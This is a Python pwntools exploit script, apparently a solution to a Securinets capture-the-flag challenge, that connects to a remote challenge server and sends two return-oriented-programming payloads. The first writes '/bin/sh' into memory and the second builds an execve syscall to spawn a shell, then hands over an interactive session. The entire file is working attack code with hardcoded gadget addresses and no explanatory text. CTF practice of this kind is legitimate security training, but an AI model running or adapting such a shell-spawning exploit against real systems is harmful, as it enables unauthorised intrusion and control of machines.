from pwn import *

context.binary = exe = ELF('./main')
#aio = process()
# gdb.attach(io, api=True)
io = remote('pwn.ctf.securinets.tn', 7777)

bin_sh = 0x4a7500
pop_rax = 0x431c77
pop_rsi = 0x40ab23
pop_rdi = 0x401f3d
pop_rdx_rbx = 0x463367
mov_ptr_rsi_rax = 0x4342e1
syscall = 0x4011a2
ret = pop_rdi+1

#io.recvuntil(b'Quit\n')
time.sleep(0.5)
io.sendline(b'1')
#io.recvuntil(b':\n')
time.sleep(0.5)
io.sendline(p64(ret) + p64(ret)[:-1])

payload = p64(ret)*12
payload += p64(pop_rax) + b'/bin/sh\0'
payload += p64(pop_rsi) + p64(bin_sh)
payload += p64(mov_ptr_rsi_rax)
payload += p64(exe.sym['main'])
#io.recvuntil(b'Quit\n')
time.sleep(0.5)
io.sendline(b'2')
#io.recvuntil(b':\n')
time.sleep(0.5)
io.sendline(payload)

#io.recvuntil(b'Quit\n')
io.sendline(b'3')



#io.recvuntil(b'Quit\n')
time.sleep(0.5)
io.sendline(b'1')
#io.recvuntil(b':\n')
time.sleep(0.5)
io.sendline(p64(ret) + p64(ret)[:-1])

payload = p64(ret)*8
payload += p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_rbx) + p64(0) + p64(0)
payload += p64(syscall)
#io.recvuntil(b'Quit\n')
time.sleep(0.5)
io.sendline(b'2')
#io.recvuntil(b':\n')
time.sleep(0.5)
io.sendline(payload)

#io.recvuntil(b'Quit\n')
time.sleep(0.5)
io.sendline(b'3')


io.interactive()